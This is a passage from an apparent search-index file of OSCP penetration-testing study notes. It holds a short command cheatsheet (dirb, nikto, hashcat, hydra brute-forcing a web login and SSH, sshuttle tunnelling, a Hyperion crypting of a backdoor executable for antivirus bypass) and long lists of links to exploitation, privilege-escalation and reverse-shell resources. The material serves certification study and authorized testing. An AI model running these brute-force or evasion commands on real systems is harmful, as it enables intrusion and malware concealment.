Applications"},{"location":"certifications/oscp/0-cheatsheet/#structure-discovery","text":"dirb http : // 10 . 0 . 0 . 1 / usr / share / wordlists / dirb / common . txt","title":"Structure Discovery"},{"location":"certifications/oscp/0-cheatsheet/#vulnerability-discovery","text":"nikto - h http ( s ) : //[ IP ] : [ PORT ]/[ DIRECTORY ]","title":"Vulnerability Discovery"},{"location":"certifications/oscp/0-cheatsheet/#password-attacks","text":"https://hashkiller.co.uk john hashes . txt hashcat - m 500 - a 0 - o output . txt \u2013 remove hashes . txt / usr / share / wordlists / rockyou . txt hydra 10 . 0 . 0 . 1 http - post - form \u201c / admin . php : target = auth mode = login user =^ USER ^ password =^ PASS ^ : invalid \u201d - P / usr / share / wordlists / rockyou . txt - l admin hydra - l admin - P / usr / share / wordlists / rockyou . txt - o results . txt ssh : // 10 . 0 . 0 . 1","title":"Password Attacks"},{"location":"certifications/oscp/0-cheatsheet/#tunneling","text":"Tunnels traffic through 10.0.0.1 and makes a route for all traffic destined for 10.10.10.0/24 through your sshuttle tunnel. sshuttle - r root @10.0.0.1 10.10.10.0 / 24 sshuttle - l ( any port ) - r root @10.10.0.1 10.10.0.0 / 24","title":"Tunneling"},{"location":"certifications/oscp/0-cheatsheet/#av-bypassing","text":"root @kali : ~/ Hyperion - 1.0 # wine hyperion . exe .. / backdoor . exe .. / backdoor_mutation . exe https://github.com/furrukhtaj/Enumerator","title":"AV Bypassing"},{"location":"certifications/oscp/0-cheatsheet/#scripts-from-awansec","text":"https://awansec.com/oscp-review.html","title":"Scripts from awansec"},{"location":"certifications/oscp/_collections/","text":"https://book.hacktricks.xyz/ https://bitvijays.github.io/LFC-VulnerableMachines.html https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf ALL DONE : - https://github.com/xxooxxooxx/xxooxxooxx.github.io/wiki/OSCP-Survival-Guide - https://github.com/xxooxxooxx/xxooxxooxx.github.io/wiki/OSCP_Helpful_Links - https://github.com/weaknetlabs/Penetration-Testing-Grimoire - http://configurationsapien.com/2019/07/ - https://github.com/anthemtotheego?tab=repositories - https://github.com/maaaaz/impacket-examples-windows - https://github.com/SecureAuthCorp/impacket/tree/master/examples - https://github.com/Kevin-Robertson?tab=repositories - https://st4rk-sec.com/methodology/ - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70 - https://github.com/gammathc/oscp_material - https://www.toshellandback.com/2015/11/24/ms-priv-esc/ - https://guif.re/windowseop - https://github.com/s0wr0b1ndef/OSCP-note - http://lerned.wikidot.com/decoding - https://github.com/xapax/security/blob/master/privilege_escalation_windows.md - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ - https://github.com/frizb/Windows-Privilege-Escalation - https://herrfeder.github.io/pentesting/2018/09/30/OSCP-Cheat-Sheet.html - https://github.com/Optixal/OSCP-PWK-Notes-Public - http://futureoscp.blogspot.com/2017/10/usefull-oscp-material.html - https://malikashish8.github.io/Walkthrough/notes/ - https://github.com/akenofu/OSCP-Cheat-Sheet - https://github.com/kank3n/pentest - https://pentest.tonyng.net/timo-sablowskis-oscp-note/ - https://github.com/StevenB23/PentesterOps - https://github.com/doffensive/wired-courtyard - https://github.com/mantvydasb/RedTeam-Tactics-and-Techniques - http://www.fuzzysecurity.com/tutorials/16.html - https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md - https://sushant747.gitbooks.io/total-oscp-guide/content/ - https://thashin.gitbooks.io/oscp-pen/content/ - https://d00mfist1.gitbooks.io/ctf/content/ - https://xapax.gitbooks.io/security/content/ - https://github.com/codingo/OSCP-2 - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/ - https://n0w4n.nl/querier/ - https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/ - https://blackwintersecurity.com/tutorials/ - https://github.com/gammathc/oscp_material/tree/master/material - http://www.tecapi.com/public/relative-vulnerability-rating-application.jsp Dropped - https://github.com/garyhooks/oscp","title":" collections"},{"location":"certifications/oscp/_preparation/","text":"Was checking https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html https://www.peerlyst.com/posts/offensive-security-certified-professional-oscp-study-guide-peerlyst-resources-chiheb-chebbi?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html https://dann.com.br/oscp-offensive-security-certification-pwk-course-review/ https://guide.offsecnewbie.com/cherrytree-oscp-template https://gist.github.com/natesubra/5117959c660296e12d3ac5df491da395 http://0xc0ffee.io/blog/OSCP-Goldmine Main Exam Guide: https://support.offensive-security.com/oscp-exam-guide/ Exam Day Prep: https://www.vortex.id.au/2017/05/oscp-exam-preparation-exam-day-report-day/ Exam requirements (also contains reporting requirements): https://support.offensive-security.com/#!oscp-exam-guide.md PWK support page: https://support.offensive-security.com/#!pwk-support.md https://guide.offsecnewbie.com/ TJNulls_Preparation_Guide: https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html https://scriptdotsh.com/index.php/2018/04/17/31-days-of-oscp-experience/ https://backdoorshell.gitbooks.io/oscp-useful-links/ Focused Cheetsheets Cheatsheets: https://ired.team/ / https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets OSCP-Cheatsheet-God: https://github.com/sumas/OSCP-Cheatsheet-God http://pwnwiki.io https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/ Guides Module Prep Guide: https://tulpasecurity.files.wordpress.com/2016/09/tulpa-pwk-prep-guide1.pdf A comprehensive guide/material for anyone looking to get into infosec or take the OSCP exam: https://github.com/RustyShackleford221/OSCP-Prep https://localhost.exposed/path-to-oscp/ https://pentesterlab.com/bootcamp https://www.cybrary.it/course/advanced-penetration-testing/ https://danielmiessler.com/study/tcpdump/ https://github.com/moshekaplan/pentesting_notes https://0xdf.gitlab.io/tags.html#oscp https://github.com/areyou1or0/OSCP https://www.xservus.com/pwndefend/hacking-101/ Sources https://jhalon.github.io/OSCP-Review/ https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob https://awansec.com/oscp-review.html https://teckk2.github.io/category/OSCP.html https://webcache.googleusercontent.com/search?q=cache:-QYejCxK0agJ:https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html+ cd=1 hl=en ct=clnk gl=lk https://web.archive.org/web/20181212154847/https://github.com/mantvydasb/Offensive-Security-OSCP-Cheatsheets https://areyou1or0.blogspot.com/2019/01/finally-oscp-may-force-be-with-you.html https://jordanpotti.com/oscp/ Sources with more tips: https://h4ck.co/oscp-journey-exam-lab-prep-tips/ Note to Check https://github.com/areyou1or0/OSCP https://github.com/nairuzabulhul/RoadMap https://gist.github.com/cokebottle/3e0916522dc09086ee45e5a93d664f16 https://www.exploit-db.com/papers/12902 Resources Pentest Monkey - Post Exploitation Without a TTY: http://pentestmonkey.net/blog/post-exploitation-without-a-tty Phineas Fisher Hacks Catalan Police Union Website: https://www.youtube.com/watch?v=oI_ZhFCS3AQ#t=25m53s Phineas Fisher - Hackingteam Writeup: http://pastebin.com/raw/0SNSvyjJ Windows / Linux Local Privilege Escalation Workshop: https://github.com/sagishahar/lpeworkshop Cheatsheets Transferring Files from Linux to Windows (post-exploitation): https://blog.ropnop.com/transferring-files-from-kali-to-windows/ Linux: Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ Windows post exploration commands: http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf https://github.com/tkal/The-Security-Handbook https://github.com/absolomb/Pentesting/blob/master/guides/LinuxPrivEsc.md http://packetlife.net/library/cheat-sheets/ http://ired.team/offensive-security-experiments/offensive-security-cheetsheets https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets https://www.matteomalvica.com/pentesting/ https://github.com/OlivierLaflamme/Cheatsheet-God VIM: https://vim.rtorr.com/ Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Nmap: https://highon.coffee/blog/nmap-cheat-sheet/ Notepad++: http://www.cheat-sheets.org/saved-copy/Notepad++_Cheat_Sheet.pdf Bash: https://www.isical.ac.in/~pdslab/2016/lectures/bash_cheat_sheet.pdf Reverse Shell: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Google: https://www.sans.org/security-resources/GoogleCheatSheet.pdf Python: https://www.tunnelsup.com/python-cheat-sheet/ Metasploit: https://www.tunnelsup.com/metasploit-cheat-sheet/ Collections windows-kernel-exploits Windows: https://github.com/SecWiki/windows-kernel-exploits http://pwnwiki.io/#!privesc/windows/index.md https://github.com/netbiosX/Checklists https://github.com/enaqx/awesome-pentest https://xapax.gitbooks.io/security/content/ NetSec Focus - Learning Resources: https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=1556200786 https://chryzsh.gitbooks.io/pentestbook https://github.com/vitalysim/Awesome-Hacking-Resources https://guif.re/ https://github.com/danielmiessler/SecLists https://sqlwiki.netspi.com/?dbms=SQLServer Practice Boxes https://h4cklife.org/2018/05/22/a-pre-exam-for-future-oscp-students/ https://drive.google.com/open?id=1p0U9yYSObcJty5REN88EQzPeDOFauIn0 https://www.secjuice.com/writeup-lazysysadmin-vulnhub/ https://pentest.join.eset.com/dns-discovery Networking References Networking Basics: TCP, UDP, TCP/IP and OSI Model - https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models Common Ports Protocols - https://pbs.twimg.com/media/DP7axHKUEAALlJB.jpg:large DNS Hacking - http://resources.infosecinstitute.com/dns-hacking/#gref Port Redirection / Tunneling - https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html http://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html Security+ Section 1: Network Security - https://www.professormesser.com/security-plus/sy0-401/sy0-401-course-index/ Nmap Basics - https://nmap.org/bennieston-tutorial/ Understanding Guide for Nmap Ping Scan (Firewall Bypass): https://www.hackingarticles.in/understanding-guide-nmap-ping-scan-firewall-bypass/ Linux References Learn Linux from the safety of your chair using a remote private linux machine with root access: https://linuxzoo.net/ Linux Journey - https://linuxjourney.com/ OverTheWire - Bandit - http://overthewire.org/wargames/bandit/ Bash Scritping Tutorial - https://linuxconfig.org/bash-scripting-tutorial Null Byte - Linux Basics - https://null-byte.wonderhowto.com/how-to/linux-basics/ Bash for Beginners - http://www.tldp.org/LDP/Bash-Beginners-Guide/html/ Explainshell - http://www.explainshell.com/ Python References Codecademy - Python - https://www.codecademy.com/learn/learn-python Python 2.7.14 Documentation - https://docs.python.org/2/index.html Violent Python Enumeration Enumeration: http://0daysecurity.com/penetration-testing/enumeration.html SMTP - https://pentestlab.blog/2012/11/20/smtp-user-enumeration/ SNMP - http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html http://resources.infosecinstitute.com/what-is-enumeration/#gref https://www.sans.edu/cyber-research/security-laboratory/article/attacks-browsing Recon sript: https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd SMB: https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/ Vanquish: https://github.com/frizb/Vanquish Reconnaissance with Recon-Ng, Part 1 (Getting Started): https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/ Buffer Overflow https://github.com/justinsteven/dostackbufferoverflowgood https://www.sans.org/reading-room/whitepapers/threats/paper/481 https://github.com/justinsteven/dostackbufferoverflowgood https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/ https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/ https://exploit-exercises.com/protostar/ http://www.opensecuritytraining.info/IntroX86.html Exploitation https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/ https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem https://highon.coffee/blog/reverse-shell-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Passing the hash with remote Desktop - https://www.kali.org/penetration-testing/passing-hash-remote-desktop/ Spawning a TTY (Interactive) Shell - https://netsec.ws/?p=337 Creating Metasploit Payloads - https://netsec.ws/?p=331 Windows exploitation https://github.com/GuardianRG/awesome-windows-exploitation - https://github.com/GuardianRG/awesome-windows-exploitation/blob/d84ec32638c7362bd21b4f66639ddc9c763e7cc7/README.md https://n0where.net/awesome-windows-exploitation-resources Privilege Escalation - linux https://github.com/pentestmonkey/unix-privesc-check Linux: linuxprivchecker.py - http://www.securitysift.com/download/linuxprivchecker.py Linux: LinEnum - https://github.com/rebootuser/LinEnum http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref Basic Linux Privilege Escalation (g0tmi1k) Linux/Unix privileges from a blackhats perspective Automated Unix Privilege Escalation Check (pentestmonkey) Privilege Escalation - Windows https://github.com/pentestmonkey/windows-privesc-check Windows Privilege Escalation Methods for Pentesters: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Windows:Elevating privileges by exploiting weak folder permissions - http://www.greyhathacker.net/?p=738 Windows: Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Using Credentials to Own Windows Boxes - Part 1 (from Kali): https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/- Windows: Privilege Escalation Fundamentals - http://www.fuzzysecurity.com/tutorials/16.html Practical Windows Privilege Escalation - https://www.youtube.com/watch?v=PC_iMqiuIRQ Automated Windows Privilege Escalation Check (pentestmonkey) Windows Privilege Escalation \u2013 a cheatsheet (Tim Arneaud) Privilege Escalation - Common MySQL Root to System Root with UDF - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/ Client Side Attacks Metasploit Unleashed - https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/ Web Attacks SQLI - https://www.exploit-db.com/papers/13045/ OverTheWire: Natas - http://overthewire.org/wargames/natas/ Learning LFI-RFI -1 - https://www.hackersonlineclub.com/lfi-rfi/ Learning LFI-RFI -2 - https://0xzoidberg.wordpress.com/category/security/lfi-rfi/ SQL Injection Cheat-sheet -1 - http://resources.infosecinstitute.com/backdoor-sql-injection/ Local file inclusion - https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf Password Attacks https://alexandreborgesbrazil.files.wordpress.com/2013/08/introduction_to_password_cracking_part_1.pdf Practice Root-me.org https://www.rebootuser.com/ https://cmdchallenge.com/ https://vim-adventures.com/ https://lab.pentestit.ru/ https://ctf365.com/ https://pentesterlab.com/bootcamp https://exploit-exercises.com/mainsequence/ http://overthewire.org/wargames/natas/ Books Penetration Testing: A Hands-On Introduction to Hacking The Hacker Playbook 3: Practical Guide To Penetration Testing The Web Application Hacker\u2019s Handbook: Finding and Exploiting Security Flaws Black Hat Python: Python Programming for Hackers and Pentesters Hacking: The Art of Exploitation, 2 nd Edition Shell https://highon.coffee/blog/reverse-shell-cheat-sheet/ Spawning a TTY Shell: https://netsec.ws/?p=337 ICMP Reverse Shell: https://resources.infosecinstitute.com/icmp-reverse-shell/#gref Payloads Creating Metasploit Payloads: https://netsec.ws/?p=331 Sites OSCP Exam Guide , PentestMonkey , Hash Cracking Sites , Privilege Escalation , Practical OSCP Tips/Tricks , Exploit-DB , Low Priv Enum Linux (g0tmi1k) , Default Credentials (open-sez.me) , RTFM online , 0daysecurity master enumeration , how to use vi (for the brave) , GTFO bins (love these), LOL Bins Corelan Buffer Overflow Exploit Part 1 Buffer Overflow Guide by Stefan Molls File Transfer Guide , SQL Auth Bypass , SQL Injection Cheat Sheet , Metasploit Basics , LFI Cheat Sheet , Cold Fusion Cheat Sheet , All The Things Payloads , Ultimate Windows Priv Esc Methods , NFS Attacks , Michael LaSalvia: Path to the OSCP , Rumkin Cyphers , All the Exploit Papers , and OSCP Practical Tips . Movie : Zero Days Audio Books : Deep Work, The Art of Invisibility, Grit, Spam Nation, Red Team: How to think like the enemy, Ghost in the Wires, The Girl With the Dragon Tattoo, and Mastery.","title":"Was checking"},{"location":"certifications/oscp/_preparation/#was-checking","text":"https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html https://www.peerlyst.com/posts/offensive-security-certified-professional-oscp-study-guide-peerlyst-resources-chiheb-chebbi?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html https://dann.com.br/oscp-offensive-security-certification-pwk-course-review/ https://guide.offsecnewbie.com/cherrytree-oscp-template https://gist.github.com/natesubra/5117959c660296e12d3ac5df491da395 http://0xc0ffee.io/blog/OSCP-Goldmine","title":"Was checking"},{"location":"certifications/oscp/_preparation/#main","text":"Exam Guide: https://support.offensive-security.com/oscp-exam-guide/ Exam Day Prep: https://www.vortex.id.au/2017/05/oscp-exam-preparation-exam-day-report-day/ Exam requirements (also contains reporting requirements): https://support.offensive-security.com/#!oscp-exam-guide.md PWK support page: https://support.offensive-security.com/#!pwk-support.md https://guide.offsecnewbie.com/ TJNulls_Preparation_Guide: https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html https://scriptdotsh.com/index.php/2018/04/17/31-days-of-oscp-experience/ https://backdoorshell.gitbooks.io/oscp-useful-links/","title":"Main"},{"location":"certifications/oscp/_preparation/#focused-cheetsheets","text":"Cheatsheets: https://ired.team/ / https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets OSCP-Cheatsheet-God: https://github.com/sumas/OSCP-Cheatsheet-God http://pwnwiki.io https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/","title":"Focused Cheetsheets"},{"location":"certifications/oscp/_preparation/#guides","text":"Module Prep Guide: https://tulpasecurity.files.wordpress.com/2016/09/tulpa-pwk-prep-guide1.pdf A comprehensive guide/material for anyone looking to get into infosec or take the OSCP exam: https://github.com/RustyShackleford221/OSCP-Prep https://localhost.exposed/path-to-oscp/ https://pentesterlab.com/bootcamp https://www.cybrary.it/course/advanced-penetration-testing/ https://danielmiessler.com/study/tcpdump/ https://github.com/moshekaplan/pentesting_notes https://0xdf.gitlab.io/tags.html#oscp https://github.com/areyou1or0/OSCP https://www.xservus.com/pwndefend/hacking-101/","title":"Guides"},{"location":"certifications/oscp/_preparation/#sources","text":"https://jhalon.github.io/OSCP-Review/ https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob https://awansec.com/oscp-review.html https://teckk2.github.io/category/OSCP.html https://webcache.googleusercontent.com/search?q=cache:-QYejCxK0agJ:https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html+ cd=1 hl=en ct=clnk gl=lk https://web.archive.org/web/20181212154847/https://github.com/mantvydasb/Offensive-Security-OSCP-Cheatsheets https://areyou1or0.blogspot.com/2019/01/finally-oscp-may-force-be-with-you.html https://jordanpotti.com/oscp/","title":"Sources"},{"location":"certifications/oscp/_preparation/#sources-with-more-tips","text":"https://h4ck.co/oscp-journey-exam-lab-prep-tips/","title":"Sources with more tips:"},{"location":"certifications/oscp/_preparation/#note-to-check","text":"https://github.com/areyou1or0/OSCP https://github.com/nairuzabulhul/RoadMap https://gist.github.com/cokebottle/3e0916522dc09086ee45e5a93d664f16 https://www.exploit-db.com/papers/12902","title":"Note to Check"},{"location":"certifications/oscp/_preparation/#resources","text":"Pentest Monkey - Post Exploitation Without a TTY: http://pentestmonkey.net/blog/post-exploitation-without-a-tty Phineas Fisher Hacks Catalan Police Union Website: https://www.youtube.com/watch?v=oI_ZhFCS3AQ#t=25m53s Phineas Fisher - Hackingteam Writeup: http://pastebin.com/raw/0SNSvyjJ Windows / Linux Local Privilege Escalation Workshop: https://github.com/sagishahar/lpeworkshop","title":"Resources"},{"location":"certifications/oscp/_preparation/#cheatsheets","text":"Transferring Files from Linux to Windows (post-exploitation): https://blog.ropnop.com/transferring-files-from-kali-to-windows/ Linux: Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ Windows post exploration commands: http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf https://github.com/tkal/The-Security-Handbook https://github.com/absolomb/Pentesting/blob/master/guides/LinuxPrivEsc.md http://packetlife.net/library/cheat-sheets/ http://ired.team/offensive-security-experiments/offensive-security-cheetsheets https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets https://www.matteomalvica.com/pentesting/ https://github.com/OlivierLaflamme/Cheatsheet-God VIM: https://vim.rtorr.com/ Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Nmap: https://highon.coffee/blog/nmap-cheat-sheet/ Notepad++: http://www.cheat-sheets.org/saved-copy/Notepad++_Cheat_Sheet.pdf Bash: https://www.isical.ac.in/~pdslab/2016/lectures/bash_cheat_sheet.pdf Reverse Shell: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Google: https://www.sans.org/security-resources/GoogleCheatSheet.pdf Python: https://www.tunnelsup.com/python-cheat-sheet/ Metasploit: https://www.tunnelsup.com/metasploit-cheat-sheet/","title":"Cheatsheets"},{"location":"certifications/oscp/_preparation/#collections","text":"windows-kernel-exploits Windows: https://github.com/SecWiki/windows-kernel-exploits http://pwnwiki.io/#!privesc/windows/index.md https://github.com/netbiosX/Checklists https://github.com/enaqx/awesome-pentest https://xapax.gitbooks.io/security/content/ NetSec Focus - Learning Resources: https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=1556200786 https://chryzsh.gitbooks.io/pentestbook https://github.com/vitalysim/Awesome-Hacking-Resources https://guif.re/ https://github.com/danielmiessler/SecLists https://sqlwiki.netspi.com/?dbms=SQLServer","title":"Collections"},{"location":"certifications/oscp/_preparation/#practice-boxes","text":"https://h4cklife.org/2018/05/22/a-pre-exam-for-future-oscp-students/ https://drive.google.com/open?id=1p0U9yYSObcJty5REN88EQzPeDOFauIn0 https://www.secjuice.com/writeup-lazysysadmin-vulnhub/ https://pentest.join.eset.com/dns-discovery","title":"Practice Boxes"},{"location":"certifications/oscp/_preparation/#networking-references","text":"Networking Basics: TCP, UDP, TCP/IP and OSI Model - https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models Common Ports Protocols - https://pbs.twimg.com/media/DP7axHKUEAALlJB.jpg:large DNS Hacking - http://resources.infosecinstitute.com/dns-hacking/#gref Port Redirection / Tunneling - https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html http://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html Security+ Section 1: Network Security - https://www.professormesser.com/security-plus/sy0-401/sy0-401-course-index/ Nmap Basics - https://nmap.org/bennieston-tutorial/ Understanding Guide for Nmap Ping Scan (Firewall Bypass): https://www.hackingarticles.in/understanding-guide-nmap-ping-scan-firewall-bypass/","title":"Networking References"},{"location":"certifications/oscp/_preparation/#linux-references","text":"Learn Linux from the safety of your chair using a remote private linux machine with root access: https://linuxzoo.net/ Linux Journey - https://linuxjourney.com/ OverTheWire - Bandit - http://overthewire.org/wargames/bandit/ Bash Scritping Tutorial - https://linuxconfig.org/bash-scripting-tutorial Null Byte - Linux Basics - https://null-byte.wonderhowto.com/how-to/linux-basics/ Bash for Beginners - http://www.tldp.org/LDP/Bash-Beginners-Guide/html/ Explainshell - http://www.explainshell.com/","title":"Linux References"},{"location":"certifications/oscp/_preparation/#python-references","text":"Codecademy - Python - https://www.codecademy.com/learn/learn-python Python 2.7.14 Documentation - https://docs.python.org/2/index.html Violent Python","title":"Python References"},{"location":"certifications/oscp/_preparation/#enumeration","text":"Enumeration: http://0daysecurity.com/penetration-testing/enumeration.html SMTP - https://pentestlab.blog/2012/11/20/smtp-user-enumeration/ SNMP - http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html http://resources.infosecinstitute.com/what-is-enumeration/#gref https://www.sans.edu/cyber-research/security-laboratory/article/attacks-browsing Recon sript: https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd SMB: https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/ Vanquish: https://github.com/frizb/Vanquish Reconnaissance with Recon-Ng, Part 1 (Getting Started): https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/","title":"Enumeration"},{"location":"certifications/oscp/_preparation/#buffer-overflow","text":"https://github.com/justinsteven/dostackbufferoverflowgood https://www.sans.org/reading-room/whitepapers/threats/paper/481 https://github.com/justinsteven/dostackbufferoverflowgood https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/ https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/ https://exploit-exercises.com/protostar/ http://www.opensecuritytraining.info/IntroX86.html","title":"Buffer Overflow"},{"location":"certifications/oscp/_preparation/#exploitation","text":"https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/ https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem https://highon.coffee/blog/reverse-shell-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Passing the hash with remote Desktop - https://www.kali.org/penetration-testing/passing-hash-remote-desktop/ Spawning a TTY (Interactive) Shell - https://netsec.ws/?p=337 Creating Metasploit Payloads - https://netsec.ws/?p=331","title":"Exploitation"},{"location":"certifications/oscp/_preparation/#windows-exploitation","text":"https://github.com/GuardianRG/awesome-windows-exploitation - https://github.com/GuardianRG/awesome-windows-exploitation/blob/d84ec32638c7362bd21b4f66639ddc9c763e7cc7/README.md https://n0where.net/awesome-windows-exploitation-resources","title":"Windows exploitation"},{"location":"certifications/oscp/_preparation/#privilege-escalation-linux","text":"https://github.com/pentestmonkey/unix-privesc-check Linux: linuxprivchecker.py - http://www.securitysift.com/download/linuxprivchecker.py Linux: LinEnum - https://github.com/rebootuser/LinEnum http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref Basic Linux Privilege Escalation (g0tmi1k) Linux/Unix privileges from a blackhats perspective Automated Unix Privilege Escalation Check (pentestmonkey)","title":"Privilege Escalation - linux"},{"location":"certifications/oscp/_preparation/#privilege-escalation-windows","text":"https://github.com/pentestmonkey/windows-privesc-check Windows Privilege Escalation Methods for Pentesters: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Windows:Elevating privileges by exploiting weak folder permissions - http://www.greyhathacker.net/?p=738 Windows: Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Using Credentials to Own Windows Boxes - Part 1 (from Kali): https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/- Windows: Privilege Escalation Fundamentals - http://www.fuzzysecurity.com/tutorials/16.html Practical Windows Privilege Escalation - https://www.youtube.com/watch?v=PC_iMqiuIRQ Automated Windows Privilege Escalation Check (pentestmonkey) Windows Privilege Escalation \u2013 a cheatsheet (Tim Arneaud)","title":"Privilege Escalation - Windows"},{"location":"certifications/oscp/_preparation/#privilege-escalation-common","text":"MySQL Root to System Root with UDF - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/","title":"Privilege Escalation - Common"},{"location":"certifications/oscp/_preparation/#client-side-attacks","text":"Metasploit Unleashed - https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/","title":"Client Side Attacks"},{"location":"certifications/oscp/_preparation/#web-attacks","text":"SQLI - https://www.exploit-db.com/papers/13045/ OverTheWire: Natas - http://overthewire.org/wargames/natas/ Learning LFI-RFI -1 - https://www.hackersonlineclub.com/lfi-rfi/ Learning LFI-RFI -2 - https://0xzoidberg.wordpress.com/category/security/lfi-rfi/ SQL Injection Cheat-sheet -1 - http://resources.infosecinstitute.com/backdoor-sql-injection/ Local file inclusion - https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf","title":"Web Attacks"},{"location":"certifications/oscp/_preparation/#password-attacks","text":"https://alexandreborgesbrazil.files.wordpress.com/2013/08/introduction_to_password_cracking_part_1.pdf","title":"Password 